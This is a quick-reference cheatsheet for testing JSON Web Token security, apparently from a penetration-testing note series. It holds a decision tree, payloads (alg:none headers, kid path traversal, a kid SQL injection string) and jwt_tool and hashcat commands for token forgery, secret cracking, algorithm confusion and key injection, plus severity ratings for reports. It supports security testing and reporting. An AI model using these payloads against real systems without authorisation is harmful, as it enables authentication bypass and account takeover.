# 07 — JWT Attack Cheatsheet

Quick-reference only. For mechanism explanations and full flag breakdowns,
see files 1–6.

## Decision Tree — Where To Start on a New Target

1. **Decode the token** (file 1, section 5). Note the `alg` value and which
   claims exist.
2. **Try `alg:none` first** (file 2, Part A) — cheapest test, zero
   prerequisites.
3. **If HS256**: attempt weak-secret cracking (file 2, Part B) with hashcat
   mode 16500 and/or jwt_tool `-C`.
4. **If RS256/PS256**: look for an exposed public key (JWKS endpoint,
   `/.well-known/jwks.json`, TLS cert) and attempt algorithm confusion
   (file 3).
5. **Check the header for `jwk` or `jku` support** — attempt JWK/JKU
   injection (file 4, Part A) regardless of the base algorithm.
6. **Check for a `kid` field** — attempt path traversal (file 4, Part B1),
   then SQL injection (file 4, Part B2) if traversal fails.
7. **Once any bypass succeeds**, or if testing with a legitimately-held
   token: attempt claim manipulation, `exp` bypass, and refresh-flow abuse
   (file 5) to determine real-world impact.
8. **If manual attempts stall**, run jwt_tool's playbook scan (`-M pb`,
   file 6) as a broad automated triage pass.

## Quick Payloads

**alg:none header:**
```json
{"alg":"none","typ":"JWT"}
```
Case variants to try if `none` is filtered: `None`, `NONE`, `nOnE`.

**Forged token structure for alg:none:**
```
<base64url(header)>.<base64url(payload)>.
```
(trailing dot, empty signature segment)

**kid path traversal:**
```json
{"kid":"../../../../dev/null"}
```
Sign with empty-string HMAC secret (`-p ""`).

**kid SQL injection (UNION-based):**
```
nonexistent' UNION SELECT 'attacker_known_secret'-- -
```
Sign with `-p "attacker_known_secret"`.

**Far-future exp bypass:**
```json
{"exp": 9999999999}
```

## Quick Commands

```bash
# Decode header/payload manually
echo -n "<base64url_segment>==" | base64 -d

# alg:none via jwt_tool
python3 jwt_tool.py <token> -X a

# HS256 weak secret — hashcat
hashcat -a 0 -m 16500 jwt_target.txt rockyou.txt
hashcat -m 16500 jwt_target.txt rockyou.txt --show

# HS256 weak secret — jwt_tool
python3 jwt_tool.py <token> -C -d rockyou.txt

# RS256 -> HS256 confusion
python3 jwt_tool.py <token> -X k -pk public_key.pem

# JWK header injection
openssl genrsa -out attacker_private.pem 2048
python3 jwt_tool.py <token> -X i -pk attacker_private.pem

# kid path traversal
python3 jwt_tool.py <token> -X i -ju "kid=../../../../dev/null" -S hs256 -p ""

# Interactive claim tampering + re-sign
python3 jwt_tool.py <token> -T -S hs256 -p "<secret>"

# Full automated triage
python3 jwt_tool.py <token> -M pb
```

## Algorithm/Attack Compatibility Matrix

| Base Algorithm | alg:none | Weak Secret Crack | Alg Confusion | JWK/JKU Injection | kid Injection | Claim Tamper (post-bypass) |
|---|---|---|---|---|---|---|
| HS256 | Yes | Yes (primary target) | N/A (already symmetric) | Yes, if supported | Yes, if `kid` used | Yes |
| RS256 | Yes | No (asymmetric, not brute-forceable this way) | Yes (primary target) | Yes, if supported | Yes, if `kid` used | Yes |
| PS256 | Yes | No | Yes (same logic as RS256) | Yes, if supported | Yes, if `kid` used | Yes |

## Reporting Severity Quick-Reference

- `alg:none` accepted → Critical (full auth bypass, trivial to exploit).
- Weak HS256 secret cracked → Critical (full auth bypass, offline forgery).
- Algorithm confusion successful → Critical (full auth bypass using public,
  by-design-exposed key material).
- JWK/JKU injection accepted → Critical (full auth bypass, zero knowledge of
  server key material required).
- `kid` path traversal / SQLi → Critical if it leads to signature bypass;
  the underlying SQLi may also warrant a separate finding if it has broader
  impact beyond the JWT context (e.g. full database read via the same
  injection point).
- Claim manipulation alone (no signature bypass) → severity depends entirely
  on what the target application does with the tampered claim; typically
  High to Critical if it grants privilege escalation.
- `exp` not enforced → Medium to High depending on session sensitivity and
  how long stale tokens remain valid.
- Refresh token not rotated on use → High (indefinite credential
  persistence after a single token theft).

## Cross-References

- Base64 encoding mechanics, header/payload/signature structure → file 1
- `alg:none` and weak secret detail → file 2
- Algorithm confusion detail (RS256/PS256) → file 3
- JWK/kid injection detail → file 4
- Claim manipulation, expiry, refresh flow detail → file 5
- Full jwt_tool flag reference → file 6
- General SQL injection methodology (for `kid` SQLi follow-up) → separate
  SQL Injection series in this note library
